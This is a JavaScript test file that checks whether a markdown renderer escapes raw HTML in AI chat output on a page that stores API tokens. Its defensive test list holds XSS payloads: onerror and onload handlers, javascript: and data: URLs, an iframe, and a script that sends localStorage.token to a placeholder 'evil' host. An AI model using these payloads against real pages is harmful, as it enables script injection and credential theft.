/**
 * test-markdown.mjs — the renderer stopped being fed only our own lessons the day the
 * mentor chat landed. Model output goes through `{@html}` in a page whose IndexedDB
 * holds a GitHub token and an Anthropic key, so "does raw HTML get escaped" is a
 * security property now, not a formatting preference.
 *
 * Run: npm test
 */
import { build } from 'esbuild';
import { writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const out = await build({
  entryPoints: [new URL('../src/lib/markdown.ts', import.meta.url).pathname],
  bundle: true, format: 'esm', write: false,
});
const file = join(tmpdir(), 'cpp-lab-markdown.mjs');
writeFileSync(file, out.outputFiles[0].text);
const { render } = await import(file);

let fails = 0;
const ok = (label, cond, extra) => {
  if (!cond) { fails++; console.log(`  FAIL  ${label}${extra ? `\n        ${extra}` : ''}`); }
  else console.log(`  PASS  ${label}`);
};

/**
 * Escaped text like `&lt;img onerror=…&gt;` is inert, so grepping the output for the
 * word "onerror" proves nothing. What matters is whether a *live* element appears —
 * so every tag in the output has to be one this renderer is supposed to emit.
 */
const EMITTED = new Set([
  'p', 'br', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'a', 'em', 'strong', 'del',
  'code', 'pre', 'span', 'ul', 'ol', 'li', 'blockquote', 'img',
  'table', 'thead', 'tbody', 'tr', 'th', 'td', 'input',
]);

function liveTags(html) {
  return [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9-]*)/g)].map((m) => m[1].toLowerCase());
}

function injected(html) {
  const stray = liveTags(html).filter((t) => !EMITTED.has(t));
  if (stray.length) return `live <${stray[0]}> in output`;
  if (/(?:href|src)\s*=\s*"(?!https?:|mailto:|#|\/)/i.test(html)) return 'attribute with a non-navigational scheme';
  if (/<[^>]*\son[a-z]+\s*=/i.test(html)) return 'live event handler attribute';
  return null;
}

const hostile = [
  ['block-level img handler', '<img src=x onerror="alert(1)">'],
  ['inline img handler', 'as we discussed <img src=x onerror=alert(1)> earlier'],
  ['script element', '<script>fetch("//evil/"+localStorage.token)</script>'],
  ['iframe', '<iframe src="//evil"></iframe>'],
  ['javascript: link', '[totally fine](javascript:alert(1))'],
  ['svg onload', '<svg onload=alert(1)></svg>'],
  ['javascript: image', '![pic](javascript:alert(1))'],
  ['data: url image', '![pic](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
  ['html comment with markup', '<!-- --><img src=x onerror=alert(1)>'],
];
for (const [label, source] of hostile) {
  const html = render(source);
  const problem = injected(html);
  ok(`neutralised: ${label}`, problem === null, problem && `${problem} — ${html.slice(0, 120)}`);
}

// ...while everything the lessons actually rely on still renders.
ok('headings still render', /<h3/.test(render('### bind() and listen()')));
ok('links still render and open in a new tab', /<a href="https:\/\/example.com"[^>]*target="_blank"/.test(render('[docs](https://example.com)')));
ok('code fences still highlight', /class="hljs language-cpp"/.test(render('```cpp\nint fd = socket(AF_INET, SOCK_STREAM, 0);\n```')));
ok('blockquote asides still render', /blockquote class="aside/.test(render('> [!TRIVIA]\n> The name is from 4.2BSD.')));
ok('inline code survives', /<code>socket\(\)<\/code>/.test(render('call `socket()` first')));

console.log(fails ? `\n  ${fails} FAILING` : '\n  all markdown cases pass');
process.exit(fails ? 1 : 0);
